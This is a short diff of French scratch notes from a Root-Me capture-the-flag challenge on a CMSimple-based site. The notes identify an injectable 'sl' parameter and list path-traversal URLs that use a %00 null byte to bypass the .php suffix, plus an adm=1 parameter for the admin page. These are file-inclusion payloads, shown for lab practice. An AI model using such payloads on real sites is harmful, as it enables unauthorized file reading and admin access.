@@ -1,0 +1,22 @@
+Le fichier cms.php est inclus dans l'index.
+Dans le fichier php on y trouve des assignments de variable dû aux differents parametres qu'il est possible d'injecter.
+Reste a savoir lesquels...
+
+
+POST_['SL'] => injectable
+ligne 69 du fichier cms.php = chemin du dossier specifié pour le parametre 
+%00 => permet de finir un string => To bypass the .php concatenation 
+http://challenge01.root-me.org/realiste/ch6/index.php?sl=../log.txt%00
+
+
+marche:
+
+http://challenge01.root-me.org/realiste/ch6/index.php?=true&adm=1&sl=../adm
+
+
+
+http://challenge01.root-me.org/realiste/ch6/index.php?=true&adm=1&sl=../../cmsimple/adm%00
+http://challenge01.root-me.org/realiste/ch6/cmsimple/adm.php
+
+
+http://challenge01.root-me.org/realiste/ch6/
